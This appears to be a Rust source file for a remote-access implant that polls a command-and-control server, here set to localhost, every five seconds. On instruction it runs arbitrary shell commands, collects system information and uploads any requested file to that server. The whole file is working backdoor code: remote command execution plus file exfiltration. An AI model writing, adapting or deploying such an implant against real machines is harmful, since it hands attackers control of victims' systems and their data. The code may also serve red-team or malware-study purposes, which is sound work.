extern crate Justice;
use reqwest::Error;
use serde_json;
use Justice::CheckInResponse;
use std::time::SystemTime;
use Justice::actions::c2_actions;
use Justice::PostRequest;
use std::process::Command;

const C2URL: &str = "http://localhost:8000";
const C2ID: &str = "12345678";

async fn check_in() -> Result<(), Error> {
    let url: String = format!("{}/c2/{}", C2URL, C2ID);
    let response = reqwest::get(url).await?;
    match response.status() {
        reqwest::StatusCode::OK => {
            println!("Successfully checked in");
            let body = response.text().await?;
            handle_body(body).await;
        }
        _ => {
            println!("error: {}", response.text().await?);
        }
    }
    Ok(())
}

async fn post(acttype: c2_actions, actparams: String, content: Vec<u8>) -> Result<(), Error> {
    let client = reqwest::Client::new();
    let url = format!("{}/c2/{}", C2URL, C2ID); // Updated URL format
    let body = serde_json::to_string(&PostRequest::new(
        SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(),
        acttype,
        actparams,
        content
    )).unwrap();
    client.post(url.as_str())
        .body(body)
        .send().await.unwrap();
    Ok(())
}

async fn register_implant() -> Result<(), Error> {
    let url: String = format!("{}/c2/{}", C2URL, C2ID);
    let response = reqwest::get(url).await?;
    match response.status() {
        reqwest::StatusCode::OK => {
            println!("Successfully registered implant");
            let body = response.text().await?;
            handle_body(body).await;
        }
        _ => {
            println!("error: {}", response.text().await?);
        }
    }
    Ok(())
}

async fn handle_body(body: String) {
    let c2_response = serde_json::from_str::<CheckInResponse>(&body);
    match c2_response {
        Ok(c2_response) => {
            match c2_response.task { 
                c2_actions::Wait => {
                    {}
                }
                c2_actions::ShellCommand => {
                    exec_shell_command(c2_response.task_parameters).await;
                }
                c2_actions::SystemInfo => {
                    send_sys_info().await;
                }
                c2_actions::FileUpload => {
                    send_file(c2_response.task_parameters).await;
                }
                _ => {
                    println!("Unknown action type");
                }
                
            }
        }
        Err(_) => {
            println!("Error parsing response");
        }
    }
}

async fn send_sys_info() {
    exec_shell_command("systeminfo.exe".to_string()).await;
}
async fn send_file(target_file: String) {
    let file = std::fs::read(&target_file);
    match file {
        Ok(file) => {
            post(c2_actions::FileUpload, target_file, file).await.unwrap();
        }
        Err(_) => {
            post(c2_actions::FileUpload, target_file, "Error reading file".as_bytes().to_vec()).await.unwrap();
        }
    }
}

async fn exec_shell_command(params: String) {
    let output = Command::new("sh")
        .arg("-c")
        .arg(&params)
        .output()
        .expect("Failed to execute command");

    if output.status.success() {
        post(c2_actions::ShellCommand, params, output.stdout).await.unwrap();
        println!("Command executed successfully");
    } else {
        println!("Command execution failed: {}", String::from_utf8_lossy(&output.stderr));
    }
}

#[tokio::main]
async fn main() -> Result<(), Error> {
    register_implant().await?;
    loop {
        check_in().await?;
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    };
    println!("Hello, world!");
    Ok(())
}
